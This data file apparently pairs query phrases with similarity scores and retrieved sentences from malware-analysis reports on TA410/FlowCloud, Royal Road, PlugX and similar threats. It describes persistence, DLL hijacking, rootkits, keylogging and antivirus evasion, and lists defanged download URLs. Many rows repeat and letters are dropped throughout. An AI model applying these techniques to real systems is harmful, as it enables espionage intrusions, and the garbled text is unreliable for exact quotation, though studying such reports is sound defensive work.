130b7e771bf45497ac2ea963c372fbaa,files were then deleted,0.7806508481570303,"[': Gogle : (Atom) #OCJP-098 285Darklech Apache ModuleIEBlackhole 285Darklech Apache ModuleInternet ExplorerBlackhole PDF/Java/.', 'Save web pages as PDF with PDFmyURL bash 0dayreal time CVE-2014-6271bash 0day24 MalwareMustDie.', 'Linux/Mayhem Linux/Mayhem wordpres wordpresbrute .', '#OCJP-128: 0day.jp Kelihos MalwareMustDie12IP1.', '(c) 2017, ZeroDay Japan | htp:/blog.0day.jp |.', '.', 'Powered by Bloger.', 'Save web pages as PDF with PDFmyURL']"
130b7e771bf45497ac2ea963c372fbaa,files were then deleted,0.7806508481570303,"[': Gogle : (Atom) #OCJP-098 285Darklech Apache ModuleIEBlackhole 285Darklech Apache ModuleInternet ExplorerBlackhole PDF/Java/.', 'Save web pages as PDF with PDFmyURL bash 0dayreal time CVE-2014-6271bash 0day24 MalwareMustDie.', 'Linux/Mayhem Linux/Mayhem wordpres wordpresbrute .', '#OCJP-128: 0day.jp Kelihos MalwareMustDie12IP1.', '(c) 2017, ZeroDay Japan | htp:/blog.0day.jp |.', '.', 'Powered by Bloger.', 'Save web pages as PDF with PDFmyURL']"
300e6b26c0db1b946c785704b5df63cf,"To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture aren’t saved.",0.7538775684053868,"['This window uses AdClipboardFormatListener (on Windows Vista or more recent) or SetClipboardViewer (on Windows XP and prior) to listen for clipboard content changes.', 'Figure 15.', 'Set up monitoring of the clipboard Colected clipboard content is stored along with information about the curent foreground window.', 'This information can help atackers understand the data by contextualizing it.', 'FlowCloud can periodicaly take screnshots and store them with information about the foreground proces and time since the last user input.', 'To limit the disk space used, images where fewer than 5% of the pixels difer from the most recently stored capture arent saved.', 'This feature can also be invoked on demand by the server.', 'Another of the backdors components records mouse and keyboard activity to a database.', 'It does not colect these directly, but instead acts in tandem with the keyloger component of the driver (described in the next section) by reading data from the \\.\\pipe\\namedpipe_keymousespy_english named pipe.', 'Interestingly, FlowCloud can also gather information about things hapening around the victims computer.', 'The first way it does so is through a C&C comand that takes a picture using conected camera peripherals.']"
300e6b26c0db1b946c785704b5df63cf,"we found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products",0.7538957340434508,"['FlowCloud deploys a rotkit to hide its activity on the compromised machine.', 'The LokBack backdor utilized by TA410 uses a custom network protocol, which can function over HTP or raw TCP, for C&C server comunications.', 'TA410 is one of the users of the Royal Road malicious document builder.', 'TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specificaly, with the atackers chosing which entry method has the best chance of infiltrating the target.', 'The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is instaled on the machine it tries to compromise, but this isnt implemented in the loaders we analyzed.', 'However, we 1/26 found a custom AntivirusCheck clas, which can check runing proceses against a hardcoded list of executable filenames from known security products, including ESET products.', 'In case one of these products is detected, FlowCloud goes through its regular loading proces and cancels the auto_start_after_instal configuration value.', 'Even though we believe that this version of FlowCloud is stil undergoing development and testing, the cyberespionage capabilities of this version include the ability to colect mouse movements, keyboard activity, and clipboard content along with information about the curent foreground window.', 'This information can help atackers understand stolen data by contextualizing it.', 'FlowCloud can also gather information about things hapening around the victims computer by taking pictures using conected camera peripherals and recording audio using a computers microphone.', 'This later function is trigered by any sound over a threshold of 65 decibels, which is in the uper range of normal conversation volume.']"
300e6b26c0db1b946c785704b5df63cf,"there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro.",0.8521835163172634,"['FlowCloud deploys a rotkit to hide its activity on the compromised machine.', 'The LokBack backdor utilized by TA410 uses a custom network protocol, which can function over HTP or raw TCP, for C&C server comunications.', 'TA410 is one of the users of the Royal Road malicious document builder.', 'TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specificaly, with the atackers chosing which entry method has the best chance of infiltrating the target.', 'The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is instaled on the machine it tries to compromise, but this isnt implemented in the loaders we analyzed.', 'However, we 1/26 found a custom AntivirusCheck clas, which can check runing proceses against a hardcoded list of executable filenames from known security products, including ESET products.', 'In case one of these products is detected, FlowCloud goes through its regular loading proces and cancels the auto_start_after_instal configuration value.', 'Even though we believe that this version of FlowCloud is stil undergoing development and testing, the cyberespionage capabilities of this version include the ability to colect mouse movements, keyboard activity, and clipboard content along with information about the curent foreground window.', 'This information can help atackers understand stolen data by contextualizing it.', 'FlowCloud can also gather information about things hapening around the victims computer by taking pictures using conected camera peripherals and recording audio using a computers microphone.', 'This later function is trigered by any sound over a threshold of 65 decibels, which is in the uper range of normal conversation volume.']"
300e6b26c0db1b946c785704b5df63cf,backdoor’s components records mouse and keyboard activity to a database.,0.7645703798463176,"['Set up monitoring of the clipboard Colected clipboard content is stored along with information about the curent foreground window.', 'This information can help atackers understand the data by contextualizing it.', 'FlowCloud can periodicaly take screnshots and store them with information about the foreground proces and time since the last user input.', 'To limit the disk space used, images where fewer than 5% of the pixels difer from the most recently stored capture arent saved.', 'This feature can also be invoked on demand by the server.', 'Another of the backdors components records mouse and keyboard activity to a database.', 'It does not colect these directly, but instead acts in tandem with the keyloger component of the driver (described in the next section) by reading data from the \\.\\pipe\\namedpipe_keymousespy_english named pipe.', 'Interestingly, FlowCloud can also gather information about things hapening around the victims computer.', 'The first way it does so is through a C&C comand that takes a picture using conected camera peripherals.', 'This feature is implemented using the CameraDS clas from OpenCV.', 'The second way it can colect information about the computers suroundings is by recording audio.']"
300e6b26c0db1b946c785704b5df63cf,"exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604",0.8702261076685985,"['Since 2018, we have sen the folowing targets, also depicted in Figure 1: FlowingFrog: University, foreign diplomatic mision of a South Asian country in China, mining company LokingFrog: Diplomatic misions, charity, government and industrial manufacturing JolyFrog: Education, church, military, diplomatic mision 2/26 Figure 1.', 'Map of countries and verticals targeted by TA410 Initial compromise and typical TPs If we exclude the diferent backdors, the thre teams use a similar modus operandi.', 'They compromise their targets either by spearphishing, acording to Profpoint, or, for LokingFrog and JolyFrog, by compromising a web-facing aplication such as Microsoft Exchange or SharePoint.', 'This could indicate that victims are targeted specificaly, with the atackers chosing which entry method is the best for a given target.', 'The public-facing aplication compromise aproach is what we have sen the most.', 'Atackers linked to LokingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604.', 'They then droped an ASPX webshel that was used to instal other malicious components.', 'These were either droped directly via the webshel or downloaded from a remote server using certutil.exe, a known LOLBin.', 'In 2020, we saw further exploitations by JolyFrog, of Microsoft SQL servers and IS servers runing custom aplications.', 'In August 2021, we observed LokBack being loaded by an IS worker proces on a server belonging to an industrial manufacturing company in Japan.', 'This hapened folowing the exploitation of the Exchange ProxyShel vulnerability on that server, as we describe in ESET Threat Report T3 2021.']"
15291170a931521942321d3bd312a3dc,Encoded Royal Road payload,0.8308154495699012,"['Royal Road!', 'Re:Dive nao-sec.org/2021/01/royal-road-redive.html nao_sec HomeArchiveAbout 2021-01-04 1/16 Abstract We introduced the Royal Road RTF Weaponizer in our previous blog [1] (and the presented at Japan Security Analyst Conference 2020 and CPX 360 CPRCon 2020).', 'Royal Road is a tol shared by many targeted atack groups believed to belong to China.', 'Its ben a year since our previous blog, and Royal Road is stil in use.', 'Here, we wil introduce the Royal Road-related atacks observed during 2020.', 'Previous Blog Lets briefly review the previous blog.']"
d5019121cbc645eb0787efab173a12b3,Encoded Royal Road payload,0.8308154495699012,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
8c15c357f2f468ad9eb3852a32ef9f2c,Encoded Royal Road payload,0.7514157697736752,"['6.', '[Online].', 'Available: htps:/blog.talosinteligence.com/2017/05/koni-malware- 21.', '[Online].', 'Available: htps:/nao-sec.org/2020/01/an-overhead-view-of-the- under-radar-for-years.html.', 'royal-road.html.', '7.', '[Online].', 'Available: htps:/blog.malwarebytes.com/threat-analysis/2020/03/ 2.', '[Online].', 'Available: htps:/malpedia.cad.fkie.fraunhofer.de/details/win.']"
8c15c357f2f468ad9eb3852a32ef9f2c,Encoded Royal Road payload,0.7514157697736752,"['6.', '[Online].', 'Available: htps:/blog.talosinteligence.com/2017/05/koni-malware- 21.', '[Online].', 'Available: htps:/nao-sec.org/2020/01/an-overhead-view-of-the- under-radar-for-years.html.', 'royal-road.html.', '7.', '[Online].', 'Available: htps:/blog.malwarebytes.com/threat-analysis/2020/03/ 2.', '[Online].', 'Available: htps:/malpedia.cad.fkie.fraunhofer.de/details/win.']"
300e6b26c0db1b946c785704b5df63cf,deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis,0.7670994097718238,"['URL requests sen by the VirusTotal sandbox during execution of the malicious RTF document The identical encrypted file was also downloaded from htp:/14.5.109[.', ']19:5602/SL3716/S8437AEB.DAT by a FlowCloud droper version 4.1.3 (SHA1: 01421BDB1EA105A6DF0C27FC14819F363704).', 'A sumary of the compromise chain is provided in Figure 6.', '5/26 Figure 6.', 'Compromise chain from the Royal Road document to FlowCloud FlowCloud FlowCloud is a complex implant writen in C+.', 'It consists of thre main components, deployed in a multistage proces that uses various obfuscation and encryption techniques to hinder analysis.', 'Multiple versions of FlowCloud have ben identified since 2020, most notably versions 4.1.3 and 5.0.1 described by Profpoint.', 'In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3.', 'Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose eror mesages and meticulous loging.', 'This deployment proces is very similar to the one described by Profpoint for version 5.0.1.', 'The thre main components are a driver with rotkit functionality, a simple persistence module, and a custom backdor.']"
300e6b26c0db1b946c785704b5df63cf,"The values for these executables and configuration data can be found, encrypted, in the loader’s resource section.",0.8864920004185773,"['Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose eror mesages and meticulous loging.', 'This deployment proces is very similar to the one described by Profpoint for version 5.0.1.', 'The thre main components are a driver with rotkit functionality, a simple persistence module, and a custom backdor.', 'We describe these in detail in the upcoming sections.', 'Loader (ClientLdrExe) The first stage is responsible mostly for creating the files and registry keys used by the other stages.', 'The values for these executables and configuration data can be found, encrypted, in the loaders resource section.', 'Table 1 contains an overview of these resources and their use.', 'Table 1.', 'Contents of the dropers resources Resource ID Role Internal name 10 FlowCloud RAT DL fcClientDl 101 32-bit rotkit driver Driver 102 64-bit rotkit driver Driver 6/26 Resource ID Role Internal name 103 DL hijacking vulnerable ap N/A 104 Shelcode loaded by the malicious library in the DL hijacking SETLANG_dlcore 105 Shelcode that loads fcClient (unused) N/A 106 Final droper stage fcClient 107 32-bit persistence module fcClientWD_x86 108 64-bit persistence module fcClientWD_x64 109 Legitimate library used for module stomping slam 10 DL used for hijacking XModule_dlcore0 10 Protobuf serialized FlowCloud configuration N/A 101 Droper configuration N/A 20 Used as an alternative or extension to resource 201 N/A 201 Path to the registry key for the PrintProcesor service (used by the driver)N/A 10 Instalation configuration N/A In the instances we observed, most resources are writen to disk encrypted, and only decrypted in memory when neded.', 'In some cases, they are then re-encrypted but with a diferent key.', 'This technique makes it harder to dump the plaintext values from the proces memory and to analyze exit dumps.']"
300e6b26c0db1b946c785704b5df63cf,"In some cases, they are then re-encrypted but with a different key",0.7915879207221734,"['Loader (ClientLdrExe) The first stage is responsible mostly for creating the files and registry keys used by the other stages.', 'The values for these executables and configuration data can be found, encrypted, in the loaders resource section.', 'Table 1 contains an overview of these resources and their use.', 'Table 1.', 'Contents of the dropers resources Resource ID Role Internal name 10 FlowCloud RAT DL fcClientDl 101 32-bit rotkit driver Driver 102 64-bit rotkit driver Driver 6/26 Resource ID Role Internal name 103 DL hijacking vulnerable ap N/A 104 Shelcode loaded by the malicious library in the DL hijacking SETLANG_dlcore 105 Shelcode that loads fcClient (unused) N/A 106 Final droper stage fcClient 107 32-bit persistence module fcClientWD_x86 108 64-bit persistence module fcClientWD_x64 109 Legitimate library used for module stomping slam 10 DL used for hijacking XModule_dlcore0 10 Protobuf serialized FlowCloud configuration N/A 101 Droper configuration N/A 20 Used as an alternative or extension to resource 201 N/A 201 Path to the registry key for the PrintProcesor service (used by the driver)N/A 10 Instalation configuration N/A In the instances we observed, most resources are writen to disk encrypted, and only decrypted in memory when neded.', 'In some cases, they are then re-encrypted but with a diferent key.', 'This technique makes it harder to dump the plaintext values from the proces memory and to analyze exit dumps.', 'The paths and registry keys to use, and whether they should be decrypted before being writen, are defined in the instalation configuration.', 'The samples we analyzed al store their files in the %ProgramFiles%\\MSBuild\\Microsoft\\Expresion\\Blend\\msole\\ directory; we believe that this is the default value.', 'FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g., rebare.dl which could be mistaken for rebar.dl) or inocuous loking (e.g., AC146142) to avoid suspicion.', 'Figure 7 presents a graphical overview of the deployment proces and its elements.']"
751a00c60e4d6cfbca29fd60f12530fc,Base64-encoded strings,0.7752022725152601,"['Figure 4.', 'Dolphin evolution timeline November 2021 version 2.0 Version 2.0 introduced the folowing changes to the version found in April 2021: 6/8 Dynamic resolution of suspicious APIs instead of static imports (for example GetAsyncKeyState) aded Shelcode capability finished and improved Persisted shelcode stored in files instead of registry Persisted shelcode loaded and executed on Dolphin startup (previously mising) Portable device file exfiltration capability finished and improved Exfiltration by extensions aded Recognition of internal memory and SD cards (from device ID) aded Comand to get files from portable devices efectively a NOP Device/drive detection and file exfiltration improved Dolphin now unconditionaly creates directory listings and exfiltrates files by extension every 30 minutes for al drives and devices (fixed drives, removable drives, portable devices).', 'Previously, it was just for removable drives; fixed drives were disabled by default and the code used for acesing portable devices was bugy and broken.', 'December 2021 version 2.2 Changes introduced in version 2.2 focused mainly on detection evasion.', 'The credential-stealing capability and comands related to it the credential stealing and Gogle acount comands were removed.', 'Most strings in this version are base64 encoded.', 'January 202 version 3.0 In version 3.0, the code was reorganized and clases renamed, with capabilities remaining unchanged.', 'The base64- encoded strings were plaintext again in this version.', 'We observed the folowing aditional changes: Comand to steal credentials restored in a diferent form; it now executes shelcode from the C&C Comand to get files from portable devices completely removed Comand to get files from drives is now cached/stored in the configuration until completion.', 'If interupted (for example by computer shutdown), it is done on the next run.', 'This is also useful in the case of removable drives that may not be conected when the comand is isued.']"
300e6b26c0db1b946c785704b5df63cf,This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC,1.0,"['This coroborates the observation by Profpoint researchers.', 'This module is embeded in the librarys resource section and encrypted with an algorithm similar to RC4.', 'The encryption/decryption function, shown in Figure 20, always uses the same key.', 'Figure 20.', 'Decompiled view of the function used to encrypt and decrypt the embeded module The SodomNormal component tries to read configuration information from a sodom.ini file.', 'This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC.', 'If this file is unavailable or invalid, a hardcoded default configuration is used.', 'A unique victim ID is then generated from the victims CPUID, username, and IP adres.', 'This is sent to the server along with the computers name and the configuration data.', 'The comunications module then downloads the main backdor module, named SodomMain, from the C&C server.', 'Unfortunately, we couldnt obtain this module.']"
f296a293bf693a509ed90a22e121f710,"The next stage, injected into iexplore.exe",0.7761325088925091,"['The malware was compiled on 24 th November 2015 and it is a 32-bit DL.', 'This shows that the sample is recent and indicates the threat actor is curently active.', 'Examining the PE structure of Syncmgr.dl shows a hiden executable embeded as one of the resources: Figure 7: Executable embeded in resource.', 'Once SyncManager.dl is executed, an iexplore.exe proces is spawned: Figure 8: A malicious iexplore.exe proces spawned.', 'Unsurprisingly, the strings of the iexplore.exe proces reveals that the malware has injected itself into the proces.', 'Figure 9: Malware injected into iexplore.exe.', 'By visualising the ProcesMonitor logs in ProcDOT, we se that two more files are created by the malware: WEB2013BW6.DAT and 60HGBC0.DAT.', 'Figure 10: Malware creates two adition .DAT files.', 'By comparing the code constructs betwen the embeded resource ASDASDASDASDSAD and WEB2013BW6.DAT, we se that they contain the identical code, as shown below: Figure 1: The embeded resource (left) and WEB2013BW6.DAT have similar code constructs.', 'However, WEB2013BW6.DAT is over 50MB in size which is significantly larger than ASDASDASDASDSAD which is only 51KB in size: Figure 12: Droped files in ApData\\Roaming\\Programs folder.', 'An examination into the PE structure of WEB2013BW6.DAT shows that a significant amount of junk characters are apended to the fot of the file: Figure 13: Pading towards the end of WEB2013BW6.DAT.']"
f296a293bf693a509ed90a22e121f710,"The next stage, injected into iexplore.exe",0.7761325088925091,"['The malware was compiled on 24 th November 2015 and it is a 32-bit DL.', 'This shows that the sample is recent and indicates the threat actor is curently active.', 'Examining the PE structure of Syncmgr.dl shows a hiden executable embeded as one of the resources: Figure 7: Executable embeded in resource.', 'Once SyncManager.dl is executed, an iexplore.exe proces is spawned: Figure 8: A malicious iexplore.exe proces spawned.', 'Unsurprisingly, the strings of the iexplore.exe proces reveals that the malware has injected itself into the proces.', 'Figure 9: Malware injected into iexplore.exe.', 'By visualising the ProcesMonitor logs in ProcDOT, we se that two more files are created by the malware: WEB2013BW6.DAT and 60HGBC0.DAT.', 'Figure 10: Malware creates two adition .DAT files.', 'By comparing the code constructs betwen the embeded resource ASDASDASDASDSAD and WEB2013BW6.DAT, we se that they contain the identical code, as shown below: Figure 1: The embeded resource (left) and WEB2013BW6.DAT have similar code constructs.', 'However, WEB2013BW6.DAT is over 50MB in size which is significantly larger than ASDASDASDASDSAD which is only 51KB in size: Figure 12: Droped files in ApData\\Roaming\\Programs folder.', 'An examination into the PE structure of WEB2013BW6.DAT shows that a significant amount of junk characters are apended to the fot of the file: Figure 13: Pading towards the end of WEB2013BW6.DAT.']"
300e6b26c0db1b946c785704b5df63cf,The loader injects an orchestrator into memory in a svchost.exe process.,0.7962004219807568,"['TA410 LokingFrog LokingFrog uses two main malware families: X4 and LokBack.', 'We have sen both of them on machines belonging to the same victim.', 'X4 X4 is a custom backdor that is used as a first stage, before LokBack is deployed.', 'It is loaded by a VMProtect-ed loader, usualy named PortableDeviceApi.dl or WptsExtensions.dl.', 'Unfortunately, we were not able to uncover any persistence method.', '18/26 The loader injects an orchestrator into memory in a svchost.exe proces.', 'In turn, the orchestrator injects the network component into memory and comunicates with it via a file located at C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\Log\\rsa.txt.', 'Figure 18 shows a sumary of the X4 components.', 'Figure 18.', 'Sumary of the X4 components The network component is shelcode.', 'It is encrypted using the AES algorithm and stored in the Windows registry.']"
300e6b26c0db1b946c785704b5df63cf,Persistence for the downloaded payload is established via the Tendyron value under the Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.,0.8650346961094122,"[']93:1702/okt.dat writen to %localapdata%\\Tendyron\\OnKeyToken_KEB.dl (SHA1: F359D3C074135BCA9A4C98A6B654690EDAE93D) htp:/103.139.2[.', ']93:1702/md.dat writen to %localapdata%\\Tendyron\\Tendyron.conf (we were not able to retrieve this file) Finaly, this proces separately downloads htp:/103.139.2[.', ']93:1702/t86.dat (resource 101), loads it into memory, and cals its startModule export.', 'Unfortunately, we were not able to retrieve this sample.', 'Tendyron.exe is a legitimate executable, signed by online-banking security vendor Tendyron Corporation, and that is vulnerable to DL search-order hijacking.', 'Persistence for the downloaded payload is established via the Tendyron 4/26 value under the Run key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Run.', 'When executed, Tendyron.exe loads the malicious OnKeyToken_KEB.dl.', 'The export OnKeyT_ContextInit contains code that decrypts hardcoded shelcode (se Figure 4) and injects it into iexplore.exe using WriteProcesMemory.', 'Figure 4.', 'Shelcode decryption lop The next stage, injected into iexplore.exe, is a backdor writen using the Microsoft Foundation Clas (MFC) framework.', 'It also contains RTI symbols and thus a few C+ clas names: ClientSocket Manager DlManager KernelManager These clas names are the same as used in Farfli/Gh0stRAT, a backdor that has ben used for more than 10 years to conduct (mostly) cyberespionage operations.']"
300e6b26c0db1b946c785704b5df63cf,It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.,1.0,"['The second one raises an exception via the INT 0x2D instruction and exits if it was handled by a debuger.', 'Figure 10.', 'Decompiler view showing the obvious patern of anti-debuging checks.', 'Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.', 'fcClient (rescure.dat) When it is first executed, this module sets up persistence and instals the backdor, rotkit, and persistence modules.', 'It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.', 'First, persistence is established by using the ITaskService COM interface to create the \\Microsoft\\Windows\\CertificateServicesClient\\NetTask scheduled task.', 'If a task with the same name already exists, it is deleted before the new one is created.', 'This task wil run the DL hijacking target as SYSTEM at each bot.', 'Afterwards, the rotkit module is decrypted and writen to the %System%\\drivers folder as hidmouse.sys.', 'A hidmouse service is then created to run that module and is imediately started.']"
e24768eaaa7eb97463cabb4f28bddbed,it can create a service,0.822347751881247,"['P2P PlugX introduced several new features which surely made atackers to manage their atack infrastructure eficiently.', 'We are sure that PlugX wil kep evolving, and continuous analysis wil be necesary for preventing/mitigating posible incident.', 'We wil kep you updated on any new findings.', 'Thank you very much for reading.', '- Shusei Tomonaga (For any inquiry or incident report regarding PlugX, please contact info[at]jpcert.or.jp) Apendix A: Entire Configuration of P2P PlugX Table 3: Entire Configuration of P2P PlugX Ofset Length Description 0x0 20 Not used 0x014 4 Flag if remove own DL from list of modules 0x018 4 Flag enable/disable key loger 0x01c 12 Not used 0x028 4 Duration of suspend activity 0x02c 4 Duration of suspend activity 0x030 672 Network Aces Flag (for a wek with 15min interval) 0x02d0 4 * 4 DNS Server IP Adres x 4 0x02e0 68 * 16 control Server Information x 16 0x0720 128 * 16 HTP Aces URL x 16 0x0f20 196 * 4 Proxy/authentication config x 4 0x1230 4 Method to make it resident (e.g.', 'Create Service.', 'Create Run Key) 0x1234 512 Folder to Instal 0x1434 512 Service Name 0x1634 512 Service Display Name 0x1834 512 Service Description 0x1a34 4 Registry Rot Key Value for Run Registry Key Configuration 0x1a38 512 Run Registry Key Name 0x1c38 512 Run Registry Key Value 0x1e38 4 Enable/Disable Code injection 0x1e3c 512 * 4 Program Name for Code Injection x 4 0x263c 4 Enable/Disable Code injection for UAC Bypas 0x2640 512 * 4 Program Name to inject code for UAC Bypas x 4 0x2e40 512 Authentication Character String for PlugX 0x3040 512 Authentication Character String for C&C Server 0x3240 512 Mutex Name 0x340 4 Enable/Disable Scren Capture 0x34 4 * 5 Scren Capture Configuration Value 0x3458 528 Folder to Store Scren Captures 0x3658 4 Enable/Disable P2P(TCP) 0x365c 4 P2P(TCP) Port Number 0x360 4 Enable/Disable P2P(UDP) 0x364 4 P2P(UDP) Port Number 0x368 4 Enable/Disable P2P(ICMP) 0x36c 4 P2P(ICMP) Port Number 0x3670 4 Enable/Disable P2P(IP Protocol Number 25) 0x3674 4 P2P(IP Protocol Number 25) Port Number 0x3678 4 Enable/Disable P2P Scaning 0x367c 4 * 4 P2P Scaning Begining Adres x 4 0x368c 4 * 4 P2P Scaning End Adres x 4 0x369c 6 Run program if this MAC Adres is used 0x36a2 2 Not used Apendix B: SHA-256 hash value of P2P PlugX bc65e2859f243f45b12cd184bfed7b809f74e67e5b61bc92ed94058d3d2515 93c85a8d0bec4e396ea2dc15c010f58d2b873d4fd7e4571a27cfe613b 0f134057a8b2e31b148fedfd185f5b1a51214949a8c5c0915cf10b10a613e']"
e24768eaaa7eb97463cabb4f28bddbed,it can create a service,0.822347751881247,"['P2P PlugX introduced several new features which surely made atackers to manage their atack infrastructure eficiently.', 'We are sure that PlugX wil kep evolving, and continuous analysis wil be necesary for preventing/mitigating posible incident.', 'We wil kep you updated on any new findings.', 'Thank you very much for reading.', '- Shusei Tomonaga (For any inquiry or incident report regarding PlugX, please contact info[at]jpcert.or.jp) Apendix A: Entire Configuration of P2P PlugX Table 3: Entire Configuration of P2P PlugX Ofset Length Description 0x0 20 Not used 0x014 4 Flag if remove own DL from list of modules 0x018 4 Flag enable/disable key loger 0x01c 12 Not used 0x028 4 Duration of suspend activity 0x02c 4 Duration of suspend activity 0x030 672 Network Aces Flag (for a wek with 15min interval) 0x02d0 4 * 4 DNS Server IP Adres x 4 0x02e0 68 * 16 control Server Information x 16 0x0720 128 * 16 HTP Aces URL x 16 0x0f20 196 * 4 Proxy/authentication config x 4 0x1230 4 Method to make it resident (e.g.', 'Create Service.', 'Create Run Key) 0x1234 512 Folder to Instal 0x1434 512 Service Name 0x1634 512 Service Display Name 0x1834 512 Service Description 0x1a34 4 Registry Rot Key Value for Run Registry Key Configuration 0x1a38 512 Run Registry Key Name 0x1c38 512 Run Registry Key Value 0x1e38 4 Enable/Disable Code injection 0x1e3c 512 * 4 Program Name for Code Injection x 4 0x263c 4 Enable/Disable Code injection for UAC Bypas 0x2640 512 * 4 Program Name to inject code for UAC Bypas x 4 0x2e40 512 Authentication Character String for PlugX 0x3040 512 Authentication Character String for C&C Server 0x3240 512 Mutex Name 0x340 4 Enable/Disable Scren Capture 0x34 4 * 5 Scren Capture Configuration Value 0x3458 528 Folder to Store Scren Captures 0x3658 4 Enable/Disable P2P(TCP) 0x365c 4 P2P(TCP) Port Number 0x360 4 Enable/Disable P2P(UDP) 0x364 4 P2P(UDP) Port Number 0x368 4 Enable/Disable P2P(ICMP) 0x36c 4 P2P(ICMP) Port Number 0x3670 4 Enable/Disable P2P(IP Protocol Number 25) 0x3674 4 P2P(IP Protocol Number 25) Port Number 0x3678 4 Enable/Disable P2P Scaning 0x367c 4 * 4 P2P Scaning Begining Adres x 4 0x368c 4 * 4 P2P Scaning End Adres x 4 0x369c 6 Run program if this MAC Adres is used 0x36a2 2 Not used Apendix B: SHA-256 hash value of P2P PlugX bc65e2859f243f45b12cd184bfed7b809f74e67e5b61bc92ed94058d3d2515 93c85a8d0bec4e396ea2dc15c010f58d2b873d4fd7e4571a27cfe613b 0f134057a8b2e31b148fedfd185f5b1a51214949a8c5c0915cf10b10a613e']"
234879358f515bf5f0ec1fe9d7779d5f,service is then created,0.840119415923005,"['It does not maintain exports and simply delivers another encrypted library maintained in its resource section.', 'This second library performs al the espionage functionality.', ""When runing on Windows 7, the malicious library uses the Metasploit Framework's open-source code Win7Elevate to inject malicious code into explorer.exe."", ""In any case, be it Windows 7 or not, this malicious code decrypts its spying library from resources, saves it to disk with an aparently random but hardcoded name, for example, ~DFE8B437D7C417A6D.TMP, in the user's temporary folder and loads this file as library."", 'This next stage library copies itself into the System32 directory of the Windows folder after the hardcoded file name - either KBDLV2.DL or AUTO.DL, depending on the malware sample.', 'Then the service is created for the service dl.', 'Service names also can difer from version to version; we discovered the folowing names - DriverManage, WebService and WebClientManager.', 'These functions asure malware persistence in a compromised OS betwen system rebots.', 'At this stage, the malware gathers information about the infected computer.', 'This includes an output of the systeminfo comand saved in the file oledvbs.inc by folowing the hardcoded path: C:Program FilesComon FilesSystemOle DBoledvbs.inc.', ""There is another function caled - the malware creates a string containing computer and user names but this isn't used anywhere.""]"
300e6b26c0db1b946c785704b5df63cf,persistence is established by using the ITaskService COM interface to create the \Microsoft\Windows\CertificateServicesClient\NetTask scheduled task,0.9871288593973735,"['Figure 10.', 'Decompiler view showing the obvious patern of anti-debuging checks.', 'Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.', 'fcClient (rescure.dat) When it is first executed, this module sets up persistence and instals the backdor, rotkit, and persistence modules.', 'It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.', 'First, persistence is established by using the ITaskService COM interface to create the \\Microsoft\\Windows\\CertificateServicesClient\\NetTask scheduled task.', 'If a task with the same name already exists, it is deleted before the new one is created.', 'This task wil run the DL hijacking target as SYSTEM at each bot.', 'Afterwards, the rotkit module is decrypted and writen to the %System%\\drivers folder as hidmouse.sys.', 'A hidmouse service is then created to run that module and is imediately started.', 'The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder.']"
a9e5224d5686f541f8796eb25399c125,creates a scheduled task for persistence.,0.8233430366709056,"['RESEARCH_ Docles Vietnam APT Inovacin y laboratorio April 2019 elevenpaths.com RESEARCH_ Docles Vietnam APT -A technique stil alive- Index What have we discovered?', '.', '3 Globaly Unique Identifier (GUID) .', '3 Docles DOC with thre stages .', '4 DOS OBFUSCATION .', '5 DISKLES POWERSHEL.', '6 The final stage, uninstaling yourself .']"
300e6b26c0db1b946c785704b5df63cf,"If a task with the same name already exists, it is deleted before the new one is created",1.0000000000000002,"['Decompiler view showing the obvious patern of anti-debuging checks.', 'Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.', 'fcClient (rescure.dat) When it is first executed, this module sets up persistence and instals the backdor, rotkit, and persistence modules.', 'It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.', 'First, persistence is established by using the ITaskService COM interface to create the \\Microsoft\\Windows\\CertificateServicesClient\\NetTask scheduled task.', 'If a task with the same name already exists, it is deleted before the new one is created.', 'This task wil run the DL hijacking target as SYSTEM at each bot.', 'Afterwards, the rotkit module is decrypted and writen to the %System%\\drivers folder as hidmouse.sys.', 'A hidmouse service is then created to run that module and is imediately started.', 'The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder.', 'Thus, anyone loking at the file on disk rather than the one maped into memory would se a legitimate, benign file.']"
